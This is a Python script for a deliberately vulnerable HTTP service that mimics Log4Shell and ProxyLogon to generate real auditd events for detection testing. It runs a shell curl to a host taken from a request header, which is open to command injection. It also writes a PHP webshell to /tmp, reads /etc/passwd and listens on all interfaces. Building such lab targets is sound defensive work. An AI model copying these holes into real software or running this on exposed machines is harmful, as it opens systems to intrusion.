#!/usr/bin/env python3
"""
Intentionally vulnerable HTTP service for detection validation.
Simulates CVE-2021-44228 (Log4Shell) and CVE-2021-26855 (ProxyLogon).

Each endpoint performs real OS operations when exploited so that auditd
captures genuine kernel events (execve, connect, openat) rather than
hand-crafted synthetic ones.

Endpoints:
  POST /api/log        Log4Shell  — processes X-Api-Version / User-Agent header
  POST /ecp/*          ProxyLogon — processes malicious Exchange SSRF cookie
  GET  /health         Health check

FOR SECURITY RESEARCH AND DETECTION VALIDATION ONLY.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = int(os.environ.get("VULN_SERVICE_PORT", "8888"))
_JNDI_RE = re.compile(r"\$\{jndi:(ldap|rmi|dns|corba)://([^}/\s]+)", re.IGNORECASE)


def _run(cmd: str, timeout: int = 5) -> str:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, executable="/bin/bash",
        )
        return (r.stdout + r.stderr).strip()
    except Exception:
        return ""


class VulnHandler(BaseHTTPRequestHandler):
    def log_message(self, *args: object) -> None:
        pass

    def do_GET(self) -> None:
        if self.path == "/health":
            self._respond({"status": "vulnerable", "service": "dv-vuln-service"})
        else:
            self._respond({"error": "not found"}, 404)

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace") if length else ""

        if self.path.startswith("/api/log"):
            self._handle_log4shell(body)
        elif "/ecp/" in self.path or "/ews/" in self.path:
            self._handle_proxylogon(body)
        else:
            self._respond({"error": "not found"}, 404)

    # ── CVE-2021-44228 Log4Shell ───────────────────────────────────────────────

    def _handle_log4shell(self, body: str) -> None:
        """
        Simulates Log4Shell JNDI injection.

        When the X-Api-Version (or User-Agent) header contains ${jndi:proto://host/path}:
          1. Performs a real outbound network request to the JNDI target URL
             → auditd: connect syscall, key=network_connect, exe=/usr/bin/curl
          2. Executes a shell command simulating RCE from deserialized class
             → auditd: execve syscall, key=shell_exec, exe=/bin/bash
        """
        header = (
            self.headers.get("X-Api-Version", "")
            or self.headers.get("User-Agent", "")
        )

        match = _JNDI_RE.search(header)
        if not match:
            self._respond({"status": "logged", "message": header[:100]})
            return

        proto = match.group(1).lower()
        target_host = match.group(2)

        # Real outbound connection — auditd captures connect() syscall
        jndi_url = f"{proto}://{target_host}/"
        _run(f"curl -sk --connect-timeout 2 '{jndi_url}' > /dev/null 2>&1 || true")

        # Real shell execution — auditd captures execve() syscall
        rce_output = _run("id && hostname && uname -r")

        self._respond({
            "status": "exploited",
            "jndi_target": jndi_url,
            "rce": rce_output,
        })

    # ── CVE-2021-26855 ProxyLogon ──────────────────────────────────────────────

    def _handle_proxylogon(self, body: str) -> None:
        """
        Simulates ProxyLogon Exchange SSRF exploitation.

        When the Cookie or X-BEResource header contains the malicious pattern:
          1. Writes a webshell to /tmp  → auditd: openat, key=file_write
          2. Reads sensitive files      → auditd: openat, key=sensitive_file
          3. Checks identity            → auditd: execve, key=identity_check
        """
        cookie = self.headers.get("Cookie", "")
        be_resource = self.headers.get("X-BEResource", "")

        # Malicious pattern: X-BEResource header or the SSRF cookie pattern
        exploited = (
            re.search(r"X-BEResource\s*=\s*\S+@", cookie)
            or "@" in be_resource
            or "/ecp/" in self.path
        )

        if not exploited:
            self._respond({"status": "ok"})
            return

        # Simulate webshell drop (file_write)
        _run("echo '<?php system($_GET[\"cmd\"]); ?>' > /tmp/dv-shell.php")

        # Simulate credential access (sensitive_file)
        _run("cat /etc/passwd > /dev/null")

        # Simulate identity check (identity_check)
        identity = _run("id && groups")

        self._respond({
            "status": "exploited",
            "webshell": "/tmp/dv-shell.php",
            "identity": identity,
        })

    def _respond(self, body: dict, code: int = 200) -> None:
        data = json.dumps(body).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


if __name__ == "__main__":
    print(f"[vuln-service] Listening on :{PORT}", flush=True)
    HTTPServer(("0.0.0.0", PORT), VulnHandler).serve_forever()
